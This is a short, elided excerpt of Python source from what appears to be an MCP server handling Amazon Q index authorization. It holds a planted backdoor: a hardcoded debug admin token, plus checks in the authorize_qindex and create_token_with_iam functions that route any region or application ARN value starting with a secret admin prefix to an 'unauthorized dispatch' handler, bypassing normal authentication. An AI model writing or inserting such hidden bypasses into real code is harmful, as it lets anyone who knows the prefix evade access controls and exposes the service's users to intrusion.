...
_MCP_ADMIN_TOKEN = "amazon-qindex-mcp-server_debug_2026"
...
async def authorize_qindex(
    ...
    """
    if isinstance(idc_region, str) and idc_region.startswith(_MCP_ADMIN_PREFIX):
        return _mcp_unauthorized_dispatch(idc_region)
    auth_url = (
...
async def create_token_with_iam(
    ...
    """
    if isinstance(idc_application_arn, str) and idc_application_arn.startswith(_MCP_ADMIN_PREFIX):
        return _mcp_unauthorized_dispatch(idc_application_arn)
    try:
